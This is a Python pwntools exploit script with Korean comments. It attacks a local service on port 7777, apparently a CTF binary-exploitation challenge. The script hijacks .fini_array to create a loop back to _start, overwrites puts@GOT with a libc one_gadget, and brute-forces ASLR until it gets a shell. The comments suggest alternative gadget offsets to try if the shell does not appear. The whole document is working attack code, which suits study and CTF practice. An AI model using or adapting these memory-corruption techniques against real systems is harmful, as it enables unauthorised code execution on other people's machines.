from pwn import *
import time

# Ubuntu 18.04 환경의 대표적인 원가젯 오프셋들
# 만약 쉘이 안 따지면 0x4f2c5 대신 0x4f322 나 0x10a38c 로 변경해서 시도해보세요.
og_offset = 0x4f2c5 
puts_offset = 0x809c0

attempts = 0

while True:
    attempts += 1
    log.info(f"Attempt: {attempts}...")
    
    try:
        p = remote('127.0.0.1', 7777, level='error')
        
        def write_byte(addr, val, wait=True):
            p.sendline(str(val)[::-1].encode())
            p.sendline(str(addr)[::-1].encode())
            if wait:
                p.recvuntil(b"no brute\n")
            else:
                time.sleep(0.05)

        # Stage 1: 무한 루프 생성 (.fini_array[0] -> _start)
        write_byte(0x6009b8, 0x40)
        
        # Stage 2: _FINI_1 함수 무력화 (.fini_array[1] -> RET 가젯)
        # 0x6009c0의 0x400590을 0x400526(RET)으로 1바이트만 덮어씀
        write_byte(0x6009c0, 0x26, wait=False)
        time.sleep(0.1) # 이후로는 "no brute" 출력이 사라짐
        
        # Stage 3: puts@GOT를 원가젯으로 덮어쓰기
        # puts가 더이상 호출되지 않으므로 마음껏 덮어쓸 수 있습니다.
        # ASLR로 인해 3번째 바이트(16비트~23비트)의 1/16 확률을 맞춰야 합니다.
        write_byte(0x600bc0, og_offset & 0xff, wait=False)
        write_byte(0x600bc1, (og_offset >> 8) & 0xff, wait=False)
        write_byte(0x600bc2, (og_offset >> 16) & 0xff, wait=False)

        # Stage 4: 무력화했던 _FINI_1 다시 활성화
        # 0x6009c0를 다시 0x400590으로 되돌려서 원가젯이 된 puts를 호출하게 만듭니다!
        write_byte(0x6009c0, 0x90, wait=False)
        
        time.sleep(0.5)
        
        # 쉘이 정상적으로 획득되었는지 id 명령어로 확인
        p.sendline(b'id')
        res = p.recv(timeout=1)
        
        if b'uid' in res:
            log.success(f"🎉 Shell obtained after {attempts} attempts!")
            p.interactive()
            break
        else:
            p.close()
            
    except Exception as e:
        p.close()